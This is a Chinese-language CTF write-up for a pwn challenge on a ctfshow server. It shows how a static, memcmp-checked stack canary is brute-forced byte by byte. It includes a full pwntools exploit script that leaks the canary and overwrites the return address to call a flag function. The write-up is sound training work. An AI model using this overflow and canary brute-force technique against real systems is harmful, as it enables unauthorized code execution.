# 挑战简介
再多一眼看一眼就会爆炸

# 思路
没有canary,但是有一个伪造canary的canary函数  

canary其实相当于一个sign，你如果有栈溢出，就相当于修改了sign值，对比的时候不匹配则报错退出，这就是canary的守护机制

一般来说canary可以是随机的，而这里只是一个txt的静态文件，所以答案显而易见，只要爆破出canary即可

而这个对比机制  
```
if ( memcmp(&s1, &global_canary, 4u) )
  {
    puts("Error *** Stack Smashing Detected *** : Canary Value Incorrect!");
    exit(-1);
  }
```

memcmp是可以逐字节爆破的，所以canary可以一个一个暴力破解解出来，最后组合成canary即可

```
from pwn import *
# 初始化一个空的字节字符串，用于存储爆破得到的 Canary 值
canary = b''
# 爆破 4 个字节的 Canary 值
for i in range(4):
    for j in range(0x100):  # 尝试所有可能的字节值（0x00 到 0x100）
        p = remote('pwn.challenge.ctf.show', 28309)
        
        p.sendline(b'200')
        
        # 构造攻击载荷
        # b'a'*0x20: 填充 32 字节的缓冲区
        # canary: 当前已爆破的 Canary 值
        # p8(j): 当前尝试的字节值
        payload = b'a'*0x20 + canary + p8(j)
        
        # 在提示符 '$ ' 后发送构造的载荷
        p.sendafter('$ ', payload)
        
        # 接收目标程序的响应
        data = str(p.recv())
        
        # 检查响应中是否包含错误信息
        if "anary Value Incorrect!" not in data:
            # 如果没有错误信息，说明当前字节值正确
            print(f"next byte is {hex(j)}")  # 打印当前字节值
            canary += p8(j)  # 将当前字节值追加到 Canary 中
            break  # 跳出内层循环，继续爆破下一个字节
        else:
            # 如果有错误信息，说明当前字节值错误
            print("trying")  # 打印尝试信息
            p.close()  # 关闭连接，继续尝试下一个字节
# 打印爆破得到的完整 Canary 值
print(f"canary is {hex(u32(canary))}")
# 再次连接到远程服务
p = remote('pwn.challenge.ctf.show', 28309)
# 加载目标程序的 ELF 文件
elf = ELF('D:\edge 下载\pwn')
flag = elf.sym['flag']
# 构造最终的攻击载荷# b'a'*0x20: 填充 32 字节的缓冲区# canary: 完整的 Canary 值# p32(0)*4: 填充 4 个 4 字节的 0，用于覆盖返回地址前的其他数据# p32(flag): 目标地址（'flag' 函数的地址）
payload = b'a'*0x20 + canary + p32(0)*4 + p32(flag)
# 发送触发漏洞的输入
p.sendline(b'1000')
# 在提示符 '$ ' 后发送构造的攻击载荷
p.sendafter('$ ', payload)
# 进入交互模式
p.interactive()
```

